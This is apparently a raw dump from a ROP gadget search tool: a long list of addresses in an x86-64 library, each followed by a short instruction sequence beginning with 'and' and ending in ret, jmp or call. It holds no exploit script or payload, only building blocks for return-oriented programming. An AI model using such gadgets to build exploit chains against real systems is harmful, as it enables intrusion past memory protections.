0x00002aaaaac6a320 : and bh, byte ptr [rbp - 4] ; jmp qword ptr [rdx + 0x22fffc7c]
0x00002aaaaac6a330 : and bh, byte ptr [rbx - 4] ; jmp qword ptr [rdx + 0x22fffc7a]
0x00002aaaaac6a338 : and bh, byte ptr [rdx - 4] ; jmp qword ptr [rdx + 0x22fffc79]
0x00002aaaaac5ed28 : and bh, byte ptr [rsi + rsi*8 - 1] ; and bh, byte ptr [rsi + rsi*8 - 1] ; mov byte ptr [rdx - 0xa], bh ; jmp qword ptr [rdx]
0x00002aaaaac5ed64 : and bh, byte ptr [rsi + rsi*8 - 1] ; and bh, byte ptr [rsi + rsi*8 - 1] ; scasb al, byte ptr [rdi] ; jns 0x189d70 ; jmp qword ptr [rdx]
0x00002aaaaac5ed34 : and bh, byte ptr [rsi + rsi*8 - 1] ; jns 0x189d38 ; jmp qword ptr [rdx]
0x00002aaaaac5ed2c : and bh, byte ptr [rsi + rsi*8 - 1] ; mov byte ptr [rdx - 0xa], bh ; jmp qword ptr [rdx]
0x00002aaaaac5eccc : and bh, byte ptr [rsi + rsi*8 - 1] ; scasb al, byte ptr [rdi] ; jns 0x189cd0 ; jmp qword ptr [rdx]
0x00002aaaaac5ed68 : and bh, byte ptr [rsi + rsi*8 - 1] ; scasb al, byte ptr [rdi] ; jns 0x189d6c ; jmp qword ptr [rdx]
0x00002aaaaac697bc : and bh, cl ; sti ; push qword ptr [rax - 0x30] ; sti ; inc eax ; sar ebx, 1 ; call qword ptr [rax]
0x00002aaaaac6f4f9 : and bh, dl ; call rsp
0x00002aaaaac89f00 : and bl, 0xf6 ; jmp qword ptr [rdi]
0x00002aaaaac69688 : and bl, ah ; sti ; jmp qword ptr [rax]
0x00002aaaaab7b137 : and bl, al ; nop dword ptr [rax] ; ret
0x00002aaaaac69988 : and bl, bh ; sti ; push qword ptr [rax - 4] ; sti ; dec dword ptr [rax + 0x28] ; cld ; call qword ptr [rax]
0x00002aaaaac82c10 : and bl, bl ; hlt ; call qword ptr [rbx]
0x00002aaaaac6a848 : and bl, byte ptr [rsi - 0x626d0004] ; cld ; jmp qword ptr [rdx]
0x00002aaaaac6b5b1 : and bl, ch ; call rsp
0x00002aaaaabe2b5f : and bl, ch ; ret
0x00002aaaaab5caf2 : and bl, ch ; xor eax, dword ptr [rax] ; add rsp, 0x18 ; ret
0x00002aaaaab0a42f : and bl, dh ; ret
0x00002aaaaab5214a : and byte ptr [r11 + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabe4d10 : and byte ptr [r8 + 0x39], r9b ; ret
0x00002aaaaab4bb8a : and byte ptr [r8 - 0x75], r9b ; sbb byte ptr [r8 + 0x29], cl ; ret 0x8948
0x00002aaaaab5da9a : and byte ptr [r8 - 0x77], cl ; jae 0x88ab2 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac09d29 : and byte ptr [r8 - 0x77], r9b ; push rdi ; sub byte ptr [rax + 1], bh ; ret
0x00002aaaaab01373 : and byte ptr [r8 - 0x77], r9b ; sti ; test rax, rax ; je 0x2c389 ; call rax
0x00002aaaaab7e3b6 : and byte ptr [r8], r14b ; in eax, dx ; mov byte ptr [rdi + 0x21], ch ; ret
0x00002aaaaab501a4 : and byte ptr [r9 + 0x5bc03113], cl ; ret
0x00002aaaaabe4e8d : and byte ptr [rax + 0x2b], cl ; xor r9b, bpl ; ret
0x00002aaaaab5be8b : and byte ptr [rax + 0x31], cl ; ret 0x93be
0x00002aaaaabe387d : and byte ptr [rax + 0x38], al ; cmp byte ptr [rbp + 0x48], dh ; mov edx, eax ; jmp 0x10e89d
0x00002aaaaabe4d11 : and byte ptr [rax + 0x39], cl ; ret
0x00002aaaaab54cd9 : and byte ptr [rax + 0x39], cl ; ret 0x820f
0x00002aaaaac07eec : and byte ptr [rax + 1], bh ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab1fe2c : and byte ptr [rax + 1], cl ; ret
0x00002aaaaab73596 : and byte ptr [rax + 1], cl ; ret 0x347c
0x00002aaaaab800ef : and byte ptr [rax + rax], cl ; ret
0x00002aaaaabdceab : and byte ptr [rax - 0x73], cl ; adc byte ptr [rax + 0x39], r9b ; ret 0x1b72
0x00002aaaaab7ae25 : and byte ptr [rax - 0x73], cl ; jg 0xa5e55 ; jne 0xa628b ; ret
0x00002aaaaab7c579 : and byte ptr [rax - 0x73], cl ; jg 0xa75a9 ; jne 0xa7a9b ; ret
0x00002aaaaab1e5e9 : and byte ptr [rax - 0x75], cl ; adc dword ptr [rax - 0x73], ecx ; add dword ptr [rax + 0x39], ecx ; ret 0x8948
0x00002aaaaabd3e5f : and byte ptr [rax - 0x75], cl ; add cl, byte ptr [rax - 0x7b] ; sal byte ptr [rbx + rcx + 0x48], 0x83 ; ret 0x4808
0x00002aaaaaafa111 : and byte ptr [rax - 0x75], cl ; and al, 0x30 ; call rax
0x00002aaaaab0dfe5 : and byte ptr [rax - 0x75], cl ; and al, 0x30 ; lea r15, qword ptr [rbx + r14] ; call rax
0x00002aaaaab902c2 : and byte ptr [rax - 0x75], cl ; je 0xbb2f3 ; cmp byte ptr [rax + 1], cl ; ret 0x6348
0x00002aaaaaaf9363 : and byte ptr [rax - 0x75], cl ; jl 0x24397 ; sbb byte ptr [rax - 0x75], cl ; and al, 0x28 ; call rax
0x00002aaaaaaf9cfe : and byte ptr [rax - 0x75], cl ; jl 0x24d32 ; sbb byte ptr [rax - 0x75], cl ; and al, 0x30 ; call rax
0x00002aaaaab9d6fd : and byte ptr [rax - 0x75], cl ; jl 0xc8731 ; sbb byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x00002aaaaab565e3 : and byte ptr [rax - 0x75], cl ; push rax ; or dh, dh ; ret 0xf04
0x00002aaaaab4bb8b : and byte ptr [rax - 0x75], cl ; sbb byte ptr [r8 + 0x29], cl ; ret 0x8948
0x00002aaaaabc7696 : and byte ptr [rax - 0x75], cl ; xor ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab4bb87 : and byte ptr [rax - 0x77], cl ; and byte ptr [r8 - 0x75], r9b ; sbb byte ptr [r8 + 0x29], cl ; ret 0x8948
0x00002aaaaab0f68a : and byte ptr [rax - 0x77], cl ; enter 0x948, -0x30 ; ret
0x00002aaaaab42fe8 : and byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaabe39dd : and byte ptr [rax - 0x77], cl ; fucompi st(0) ; ret 0xf10e
0x00002aaaaab5da9b : and byte ptr [rax - 0x77], cl ; jae 0x88ab1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac09d2a : and byte ptr [rax - 0x77], cl ; push rdi ; sub byte ptr [rax + 1], bh ; ret
0x00002aaaaab10463 : and byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab94a51 : and byte ptr [rax - 0x77], cl ; ret 0x1e74
0x00002aaaaac15472 : and byte ptr [rax - 0x77], cl ; ret 0x3d83
0x00002aaaaab92fb6 : and byte ptr [rax - 0x77], cl ; ret 0x4eb
0x00002aaaaab1b98c : and byte ptr [rax - 0x77], cl ; ret 0x8949
0x00002aaaaabeda55 : and byte ptr [rax - 0x77], cl ; ret 0xed75
0x00002aaaaaaf7d04 : and byte ptr [rax - 0x77], cl ; ret 0xee75
0x00002aaaaab48f2d : and byte ptr [rax - 0x77], cl ; sbb byte ptr [rax - 0x77], cl ; sub byte ptr [rax - 0x77], cl ; ret 0x9e9
0x00002aaaaab01374 : and byte ptr [rax - 0x77], cl ; sti ; test rax, rax ; je 0x2c388 ; call rax
0x00002aaaaac0865b : and byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rcx - 0x18] ; ret 0xffee
0x00002aaaaaaf7b96 : and byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab441a4 : and byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4d9d2 : and byte ptr [rax - 1], bh ; pop rbx ; ret
0x00002aaaaac6a030 : and byte ptr [rax - 4], al ; jmp qword ptr [rax + 0x20fffc41]
0x00002aaaaac69f98 : and byte ptr [rax - 4], bl ; call qword ptr [rax + 0x10fffc57]
0x00002aaaaac6931c : and byte ptr [rax - 5], 0xff ; shl byte ptr [rcx - 5], 1 ; jmp qword ptr [rax]
0x00002aaaaac69b00 : and byte ptr [rax], ah ; cld ; push qword ptr [rax + 0x21] ; cld ; inc eax ; and bh, ah ; call qword ptr [rax]
0x00002aaaaabc0dd0 : and byte ptr [rax], al ; add byte ptr [rax + 9], cl ; ret 0x8949
0x00002aaaaabbff36 : and byte ptr [rax], al ; add byte ptr [rax + 9], cl ; ret 0x8b48
0x00002aaaaaba1f2b : and byte ptr [rax], al ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x00002aaaaab0862d : and byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rsp + 0x28], rcx ; call 0x1f8ab
0x00002aaaaab7f10c : and byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaaba1f10 : and byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaabfae8a : and byte ptr [rax], al ; jmp 0x125e53
0x00002aaaaaad544b : and byte ptr [rax], al ; mov dword ptr [rcx + 0x7c05000c], eax ; adc byte ptr [rsp + rcx], bl ; ret 0x4412
0x00002aaaaac69fdc : and byte ptr [rax], bh ; cld ; jmp qword ptr [rax + 0x20fffc39]
0x00002aaaaac699d0 : and byte ptr [rax], ch ; cld ; jmp rax
0x00002aaaaab7c26c : and byte ptr [rax], cl ; add byte ptr [rax], al ; ret
0x00002aaaaab7e3b7 : and byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x21], ch ; ret
0x00002aaaaac0cafe : and byte ptr [rbp + 0x5b0d74c0], al ; pop rbp ; pop r12 ; ret
0x00002aaaaabab1bc : and byte ptr [rbp - 0x3a7cfeaf], cl ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaac69380 : and byte ptr [rbp - 0x795f0005], al ; sti ; jmp qword ptr [rax]
0x00002aaaaabf9ad7 : and byte ptr [rbp - 0x7b], al ; in al, 0xf ; test dh, bh ; add al, byte ptr [rax] ; add byte ptr [rcx], bh ; ret
0x00002aaaaabaa1fc : and byte ptr [rbp - 0x7cb7febd], cl ; ret
0x00002aaaaac69f70 : and byte ptr [rbp - 4], dl ; jmp qword ptr [rax + 0x20fffc54]
0x00002aaaaab173c9 : and byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; fmul st(0) ; ret
0x00002aaaaab17347 : and byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; fmulp st(1) ; ret
0x00002aaaaab07fc8 : and byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab441b6 : and byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac7150d : and byte ptr [rbx + 0xa410204], al ; ret
0x00002aaaaac7640d : and byte ptr [rbx + 0xa470204], al ; ret
0x00002aaaaac78655 : and byte ptr [rbx + 0xa4d0204], al ; ret
0x00002aaaaac80dfd : and byte ptr [rbx + 0xa7e0204], al ; ret
0x00002aaaaac692d4 : and byte ptr [rbx + rdi*8], bh ; inc dword ptr [rax] ; sti ; call rax
0x00002aaaaab2f2af : and byte ptr [rbx - 0x109743], al ; call qword ptr [rax]
0x00002aaaaac025cc : and byte ptr [rbx - 0x48], bl ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbp ; pop r12 ; ret
0x00002aaaaab22c5a : and byte ptr [rbx - 0x4ef43], al ; call qword ptr [rax]
0x00002aaaaac6a76c : and byte ptr [rbx - 0x554f0004], ch ; cld ; inc dword ptr [rax - 0x56] ; cld ; call rax
0x00002aaaaac693cc : and byte ptr [rbx - 0x5f9a0003], ah ; std ; call qword ptr [rcx]
0x00002aaaaab430d9 : and byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00002aaaaac849c0 : and byte ptr [rbx - 0xb], bl ; jmp qword ptr [rcx]
0x00002aaaaac6a038 : and byte ptr [rbx - 4], al ; jmp qword ptr [rax + 0x20fffc44]
0x00002aaaaac69324 : and byte ptr [rbx - 5], ah ; push qword ptr [rax + 0x64] ; sti ; inc eax ; sti ; call qword ptr [rax]
0x00002aaaaac69350 : and byte ptr [rbx - 5], dh ; jmp qword ptr [rax + 0x20fffb74]
0x00002aaaaac69fe4 : and byte ptr [rbx], bh ; cld ; jmp qword ptr [rax + 0x20fffc3c]
0x00002aaaaaafe81c : and byte ptr [rcx + 0x39], cl ; ret
0x00002aaaaab501a5 : and byte ptr [rcx + 0x5bc03113], cl ; ret
0x00002aaaaac740e6 : and byte ptr [rcx + 0xa], al ; ret
0x00002aaaaac003bb : and byte ptr [rcx + rcx*4 + 0x4c], cl ; and al, 0x28 ; call 0x137648
0x00002aaaaab1f805 : and byte ptr [rcx + rcx*4 - 0x40], cl ; pop rbx ; ret
0x00002aaaaab8eb40 : and byte ptr [rcx + rcx*4 - 0xa], cl ; mov rdi, r12 ; call rbx
0x00002aaaaab1f215 : and byte ptr [rcx - 0x2413dbbc], cl ; insb byte ptr [rdi], dx ; and al, 0xe8 ; ret
0x00002aaaaac113d8 : and byte ptr [rcx - 0x75], cl ; push rdi ; sbb byte ptr [rcx + 0x63], cl ; ret
0x00002aaaaaaf7c8c : and byte ptr [rcx - 0x77], cl ; ret 0xee75
0x00002aaaaac69ff4 : and byte ptr [rcx - 4], al ; jmp qword ptr [rax + 0x20fffc42]
0x00002aaaaac69360 : and byte ptr [rcx - 5], bh ; jmp qword ptr [rax + 0x20fffb7a]
0x00002aaaaac81ffd : and byte ptr [rcx], al ; add al, dh ; xchg eax, ebx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81f9d : and byte ptr [rcx], al ; add byte ptr [rax - 0x6d], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81fb5 : and byte ptr [rcx], al ; add byte ptr [rax - 0x6d], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaabcc6c0 : and byte ptr [rcx], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaac82015 : and byte ptr [rcx], al ; add byte ptr [rax], cl ; xchg eax, esp ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac76890 : and byte ptr [rcx], al ; in eax, dx ; call qword ptr [rsi]
0x00002aaaaac69a54 : and byte ptr [rcx], ch ; cld ; inc dword ptr [rax] ; sub edi, esp ; jmp rax
0x00002aaaaab4cea9 : and byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaac07f7b : and byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaab9bb38 : and byte ptr [rcx], dh ; test byte ptr [rcx - 0x7d], 0xc6 ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaac7bd50 : and byte ptr [rdi - 0x11], bh ; call qword ptr [rdi]
0x00002aaaaac7a880 : and byte ptr [rdi - 0x12], cl ; call qword ptr [rdx]
0x00002aaaaac6a05c : and byte ptr [rdi - 0x794f0004], al ; cld ; inc dword ptr [rax - 0x7a] ; cld ; call rax
0x00002aaaaac84e40 : and byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac6a004 : and byte ptr [rdi - 4], al ; jmp qword ptr [rax + 0x20fffc48]
0x00002aaaaac69b70 : and byte ptr [rdi - 4], bl ; push qword ptr [rax + 0x40fffc5e] ; pop rsi ; cld ; call rax
0x00002aaaaac6a290 : and byte ptr [rdi - 4], dh ; jmp rax
0x00002aaaaac69f60 : and byte ptr [rdi - 4], dl ; jmp qword ptr [rax + 0x20fffc56]
0x00002aaaaac69370 : and byte ptr [rdi - 5], bh ; jmp qword ptr [rax + 0x20fffb80]
0x00002aaaaac69a70 : and byte ptr [rdi], ah ; cld ; jmp rax
0x00002aaaaab02e15 : and byte ptr [rdi], cl ; mov bh, 0xc0 ; ret
0x00002aaaaaaf7c79 : and byte ptr [rdi], cl ; test byte ptr [rcx], al ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab7ae29 : and byte ptr [rdi], cl ; test dword ptr [rax + 4], edx ; add byte ptr [rax], al ; ret
0x00002aaaaaaf7d78 : and byte ptr [rdi], cl ; test eax, ecx ; add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaac44d60 : and byte ptr [rdi], cl ; test ebx, ecx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x00002aaaaabfb150 : and byte ptr [rdi], cl ; xchg eax, esp ; ret 0x93c
0x00002aaaaabd2e9d : and byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd108
0x00002aaaaabd2e3c : and byte ptr [rdi], cl ; xchg eax, esp ; sar dword ptr [rsp + rbx*2], 0xf ; xchg eax, esp ; ret 0xd108
0x00002aaaaac6a018 : and byte ptr [rdi], dh ; cld ; jmp qword ptr [rax + 0x20fffc38]
0x00002aaaaac69278 : and byte ptr [rdi], dl ; sti ; call qword ptr [rax]
0x00002aaaaac69378 : and byte ptr [rdx - 0x7c5f0005], al ; sti ; jmp qword ptr [rax]
0x00002aaaaac85080 : and byte ptr [rdx - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac86e80 : and byte ptr [rdx], 0xf6 ; jmp qword ptr [rsi]
0x00002aaaaac6a020 : and byte ptr [rdx], bh ; cld ; jmp qword ptr [rax + 0x20fffc3b]
0x00002aaaaac69b14 : and byte ptr [rdx], dl ; cld ; push qword ptr [rax + 0x13] ; cld ; inc eax ; adc al, 0xfc ; call qword ptr [rax]
0x00002aaaaac69a3c : and byte ptr [rip + 0x2f00fffc], ch ; cld ; call rax
0x00002aaaaac69fd4 : and byte ptr [rip + 0x36a0fffc], dh ; cld ; jmp qword ptr [rax]
0x00002aaaaac6a028 : and byte ptr [rip + 0x3ea0fffc], bh ; cld ; jmp qword ptr [rax]
0x00002aaaaac48732 : and byte ptr [rip + 0x5be17500], ah ; ret
0x00002aaaaac105ec : and byte ptr [rsi + 0x11], dh ; add dword ptr [rdi + 0x28], esi ; mov rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaac428fa : and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac428f5 : and byte ptr [rsi + 0xf], ah ; out dx, eax ; push rsi ; and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab73513 : and byte ptr [rsi + 0xf], ah ; xlatb ; rol dword ptr [rbp + 0x317475c0], -0x40 ; ret
0x00002aaaaac8eafd : and byte ptr [rsi + rcx + 0x18], ah ; ret
0x00002aaaaac74b75 : and byte ptr [rsi + rcx + 0x18], bh ; ret
0x00002aaaaabd05df : and byte ptr [rsi + rcx + 0x48], dh ; xor eax, 0x20 ; mov qword ptr [rsi + 0x48], rax ; ret
0x00002aaaaabac129 : and byte ptr [rsi - 0x15], dh ; ret 0x9066
0x00002aaaaaad7c0e : and byte ptr [rsi - 0x32], dh ; clc ; ret
0x00002aaaaac695f0 : and byte ptr [rsi - 0x482e0003], dh ; std ; call rcx
0x00002aaaaac6a554 : and byte ptr [rsi - 0x524f0004], ch ; cld ; inc dword ptr [rax - 0x53] ; cld ; call rax
0x00002aaaaac6a040 : and byte ptr [rsi - 4], al ; jmp qword ptr [rax + 0x20fffc47]
0x00002aaaaac69f68 : and byte ptr [rsi - 4], dl ; jmp qword ptr [rax + 0x20fffc55]
0x00002aaaaac69358 : and byte ptr [rsi - 5], dh ; jmp qword ptr [rax + 0x20fffb77]
0x00002aaaaac69fec : and byte ptr [rsi], bh ; cld ; jmp qword ptr [rax + 0x20fffc3f]
0x00002aaaaab7a036 : and byte ptr [rsi], cl ; add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaabd3731 : and byte ptr [rsp + rbp*8 + 0x41], dh ; mov byte ptr [rax - 1], 0 ; ret
0x00002aaaaac6a958 : and byte ptr [rsp + rdi*8 - 0x35c6f01], ah ; call qword ptr [rax]
0x00002aaaaac6a274 : and byte ptr [rsp + rdi*8 - 0x37c4f01], al ; inc dword ptr [rax - 0x7d] ; cld ; call rax
0x00002aaaaac81f9c : and byte ptr fs:[rcx], al ; add byte ptr [rax - 0x6d], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab80382 : and ch, 0xf ; je 0xab3a9 ; add rax, 2 ; ret
0x00002aaaaac56285 : and ch, bl ; call rdx
0x00002aaaaac56289 : and ch, bl ; jmp rsp
0x00002aaaaac6a640 : and ch, byte ptr [rcx - 0x574d0004] ; cld ; inc dword ptr [rdx - 0x58] ; cld ; call rdx
0x00002aaaaac6d329 : and ch, dh ; dec dword ptr [rsp + 0x21040001] ; cmc ; jmp rsp
0x00002aaaaab8036d : and cl, 0xf ; je 0xab395 ; ret
0x00002aaaaaad895a : and cl, ah ; ret
0x00002aaaaac69684 : and cl, ah ; sti ; jmp qword ptr [rax]
0x00002aaaaab7ec99 : and cl, byte ptr [rax + 1] ; ror byte ptr [rax - 0x2f], 1 ; call 0xffffffffc30f29fb
0x00002aaaaab1c254 : and cl, byte ptr [rax - 0x7d] ; ret
0x00002aaaaabdce7f : and cl, byte ptr [rax] ; add byte ptr [rdi], cl ; mov bh, 0xff ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab693d8 : and cl, byte ptr [rcx + rcx*4 - 0x28] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab6311d : and cl, byte ptr [rcx - 0x77] ; ret
0x00002aaaaabeda15 : and cl, byte ptr [rcx - 0x7d] ; ret 0x4104
0x00002aaaaab26158 : and cl, ch ; ret 0xfffa
0x00002aaaaab4c4f5 : and dh, 0x7f ; cmp esi, 2 ; je 0x77513 ; mov dword ptr [rdi], edx ; ret
0x00002aaaaac6cdf9 : and dh, bl ; jmp rsp
0x00002aaaaab584f9 : and dh, byte ptr [rax + rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac86e09 : and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaabb09ff : and dh, dh ; ret
0x00002aaaaab63747 : and dh, dh ; ret 0x7504
0x00002aaaaac7f411 : and dh, dl ; jmp qword ptr [rcx]
0x00002aaaaab2b83d : and dil, al ; add ch, byte ptr [rip - 0x7d000000] ; ret
0x00002aaaaac811f0 : and dl, bl ; jmp qword ptr [rcx]
0x00002aaaaac5d748 : and dl, byte ptr [rax - 0xc] ; dec dword ptr [rcx] ; push rbp ; hlt ; call qword ptr [rbx]
0x00002aaaaac5d5d4 : and dl, byte ptr [rax - 0xc] ; inc dword ptr [rax + 0x51] ; hlt ; dec dword ptr [rdx + 0x51] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d934 : and dl, byte ptr [rax - 0xc] ; inc dword ptr [rbp + 0x55] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d840 : and dl, byte ptr [rax - 0xc] ; jmp qword ptr [rcx + 0x22fff452]
0x00002aaaaac5d5d0 : and dl, byte ptr [rax - 0xc] ; jmp qword ptr [rdx]
0x00002aaaaac5d94c : and dl, byte ptr [rax - 0xc] ; jmp rax
0x00002aaaaac5d5f4 : and dl, byte ptr [rax - 0xc] ; lcall ptr [rcx + 0x22fff451] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d800 : and dl, byte ptr [rax - 0xc] ; lcall ptr [rcx + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d660 : and dl, byte ptr [rax - 0xc] ; ljmp ptr [rbx + 0x22fff452] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d7ec : and dl, byte ptr [rax - 0xc] ; push qword ptr [rbp + 0x22fff452] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d7e4 : and dl, byte ptr [rax - 0xc] ; push qword ptr [rsi] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d630 : and dl, byte ptr [rdx - 0xc] ; ljmp ptr [rdx + rdx*2] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaabfbeff : and dword ptr [rax + 0x40], 0xfffffff9 ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba7387 : and dword ptr [rax - 0x7d], ecx ; ret 0x8b04
0x00002aaaaab24ff1 : and dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaac59ea2 : and dword ptr [rax], edx ; jmp qword ptr [rdi]
0x00002aaaaab47cbf : and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaaaf696e : and dword ptr [rcx + 0x2cba0016], 0 ; add byte ptr [rax], al ; call 0x2dc4b
0x00002aaaaab44779 : and dword ptr [rcx + 0x415d5bd8], ecx ; pop rsp ; ret
0x00002aaaaac5e40c : and dword ptr [rcx - 0x6982000b], ebx ; cmc ; jmp qword ptr [rbx]
0x00002aaaaabf8526 : and dword ptr [rcx - 0xa], eax ; ret
0x00002aaaaab17203 : and dword ptr [rcx], esi ; ror byte ptr [rax + 1], cl ; ret 0x9a74
0x00002aaaaab8537b : and dword ptr [rcx], esi ; ror byte ptr [rax + 1], cl ; ret 0x9e74
0x00002aaaaab0af66 : and dword ptr [rdi + rdx*8], eax ; xor eax, eax ; ret
0x00002aaaaab4cef0 : and dword ptr [rdi], 0xffffffcf ; ret
0x00002aaaaab0b0c8 : and dword ptr [rdi], eax ; xor eax, eax ; ret
0x00002aaaaac7d870 : and dword ptr [rdi], ebp ; int1 ; jmp qword ptr [rax]
0x00002aaaaac56f59 : and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x00002aaaaab7ac5b : and dword ptr [rsi], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac59ea1 : and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x00002aaaaac489b6 : and eax, 0 ; add bl, dh ; ret
0x00002aaaaaaf5beb : and eax, 0 ; ret
0x00002aaaaabd0723 : and eax, 0x100f ; ret
0x00002aaaaab0a18a : and eax, 0x200 ; ret
0x00002aaaaac56359 : and eax, 0x25e0ffeb ; jmp 0x181365
0x00002aaaaac5635d : and eax, 0x25e0ffeb ; jmp 0x181369
0x00002aaaaac56361 : and eax, 0x25e0ffeb ; jmp 0x18136d
0x00002aaaaac56365 : and eax, 0x25e0ffeb ; jmp 0x181371
0x00002aaaaac56369 : and eax, 0x25e0ffeb ; jmp 0x181375
0x00002aaaaac5636d : and eax, 0x25e0ffeb ; jmp 0x181379
0x00002aaaaac56371 : and eax, 0x25e0ffeb ; jmp 0x18137d
0x00002aaaaac56375 : and eax, 0x25e0ffeb ; jmp 0x181381
0x00002aaaaac692a1 : and eax, 0x26a0fffb ; sti ; inc dword ptr [rax + 0x28] ; sti ; jmp rax
0x00002aaaaac56351 : and eax, 0x270effeb ; jmp 0x18135d
0x00002aaaaac56350 : and eax, 0x270effeb ; jmp 0x18135e
0x00002aaaaac152db : and eax, 0x281660 ; ret
0x00002aaaaabdb824 : and eax, 0x2d0 ; pop rax ; pop rdi ; call rax
0x00002aaaaaba1676 : and eax, 0x2d0 ; ret
0x00002aaaaaaf5b88 : and eax, 0x30 ; add rsp, 0x28 ; jmp rax
0x00002aaaaab61ca7 : and eax, 0x30 ; add rsp, 8 ; jmp rax
0x00002aaaaaaf584d : and eax, 0x30 ; call rax
0x00002aaaaab0efc9 : and eax, 0x30 ; call rdx
0x00002aaaaab0a322 : and eax, 0x30 ; jmp rax
0x00002aaaaab0f5f3 : and eax, 0x30 ; mov qword ptr fs:[rbp], rdx ; call rax
0x00002aaaaab046d3 : and eax, 0x30 ; mov rdi, r13 ; call rax
0x00002aaaaabe9c7a : and eax, 0x30 ; test rax, rax ; je 0x114cba ; call rax
0x00002aaaaab22398 : and eax, 0x30 ; xor esi, esi ; call rax
0x00002aaaaab7f06d : and eax, 0x3fc00 ; pop rbx ; ret
0x00002aaaaab7f08d : and eax, 0x3fc00 ; ret
0x00002aaaaab7f125 : and eax, 0x3fffc00 ; div ecx ; pop rbx ; mov eax, eax ; ret
0x00002aaaaab7f04c : and eax, 0x3fffc00 ; pop rbx ; ret
0x00002aaaaabbed9b : and eax, 0x40 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac77a2c : and eax, 0x4000001 ; ret 0x18f
0x00002aaaaabd717f : and eax, 0x49fff1d7 ; mov edi, dword ptr [rbp] ; call rbx
0x00002aaaaac48733 : and eax, 0x5be17500 ; ret
0x00002aaaaab03c92 : and eax, 0x63480015 ; adc al, 0x88 ; add rax, rdx ; jmp rax
0x00002aaaaabac0c1 : and eax, 0x798003ff ; or byte ptr [rdx], al ; jne 0xd70ab ; jmp 0xd709b
0x00002aaaaac5d76c : and eax, 0x79fff451 ; push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab02f22 : and eax, 0x7f ; ret
0x00002aaaaab7f0c0 : and eax, 0x7ff80000 ; ret
0x00002aaaaab09b44 : and eax, 0x80 ; ret
0x00002aaaaab09c07 : and eax, 0x80000000 ; movd xmm0, eax ; ret
0x00002aaaaab4c402 : and eax, 0x804 ; ret
0x00002aaaaabd2e5d : and eax, 0x83489066 ; ret 0x3c01
0x00002aaaaabada29 : and eax, 0x8348d231 ; ret 0x4801
